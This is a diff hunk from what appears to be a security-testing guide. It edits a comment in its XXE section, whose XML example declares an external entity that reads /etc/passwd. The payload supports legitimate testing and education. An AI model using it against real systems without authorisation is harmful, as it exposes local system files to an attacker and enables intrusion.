@@ -347,8 +347,8 @@ Contexts to test:
 **XXE** - If XML processing exists:
 
 ```xml
-<!-- Test in SOAP APIs, XML uploads, RSS feeds -->
 <?xml version="1.0"?>
+<!-- Test in SOAP APIs, XML uploads, RSS feeds. The external entity is the payload. -->
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <root>&xxe;</root>
 ```
